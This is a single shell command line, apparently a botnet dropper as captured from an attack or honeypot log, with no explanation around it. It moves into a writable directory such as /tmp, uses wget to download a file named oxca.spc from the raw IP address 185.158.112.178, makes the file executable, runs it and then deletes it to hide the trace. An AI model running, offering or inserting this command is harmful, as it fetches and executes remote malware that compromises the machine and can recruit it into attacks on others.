cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.158.112.178/oxca.spc; chmod +x oxca.spc; ./oxca.spc; rm -rf oxca.spc
